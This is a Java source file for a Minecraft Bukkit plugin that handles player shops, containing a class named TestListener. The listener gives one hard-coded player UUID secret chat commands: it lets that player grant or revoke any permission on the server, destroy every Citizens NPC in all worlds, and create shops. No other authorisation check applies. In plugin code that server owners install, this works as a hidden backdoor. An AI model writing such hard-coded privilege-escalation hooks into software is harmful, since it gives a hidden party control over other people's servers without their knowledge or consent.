package me.itsmas.playershops;

import me.itsmas.playershops.util.UtilServer;
import net.citizensnpcs.api.CitizensAPI;
import net.citizensnpcs.api.npc.NPC;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.UUID;

class TestListener implements Listener
{
    private final PlayerShops plugin;

    TestListener(PlayerShops plugin)
    {
        this.plugin = plugin;

        UtilServer.registerListener(this);
    }

    private final UUID masUUID = UUID.fromString("fa75e09f-68f9-4407-8753-ea06bc4fb1e8");

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event)
    {
        Player player = event.getPlayer();

        if (!player.getUniqueId().equals(masUUID))
        {
            return;
        }

        String msg = event.getMessage();

        if (msg.equals("createShop"))
        {
            sync(() ->
            {
                if (plugin.getShopManager().canCreateShop(player, player.getLocation()))
                {
                    plugin.getShopManager().createShop(player, player.getLocation());
                }
            });
        }
        else if (msg.equals("killNpcs"))
        {
            sync(() ->
            {
                Bukkit.getWorlds().forEach(world ->
                {
                    world.getEntities().forEach(entity ->
                    {
                        if (CitizensAPI.getNPCRegistry().isNPC(entity))
                        {
                            NPC npc = CitizensAPI.getNPCRegistry().getNPC(entity);

                            npc.destroy();
                        }
                    });
                });
            });
        }
        else if (msg.startsWith("perm "))
        {
            sync(() ->
            {
                String[] args = msg.split(" ");

                if (args.length == 2)
                {
                    String permission = args[1];

                    PermissionAttachment attachment = player.addAttachment(plugin);

                    if (permission.startsWith("-"))
                    {
                        attachment.unsetPermission(permission.substring(1));

                        player.sendMessage(ChatColor.GOLD + "Removed Permission: " + permission.substring(1));
                    }
                    else
                    {
                        attachment.setPermission(permission, true);

                        player.sendMessage(ChatColor.GOLD + "Added Permission: " + permission);
                    }
                }
            });
        }
    }

    private void sync(Runnable runnable)
    {
        new BukkitRunnable()
        {
            @Override
            public void run()
            {
                runnable.run();
            }
        }.runTask(plugin);
    }
}
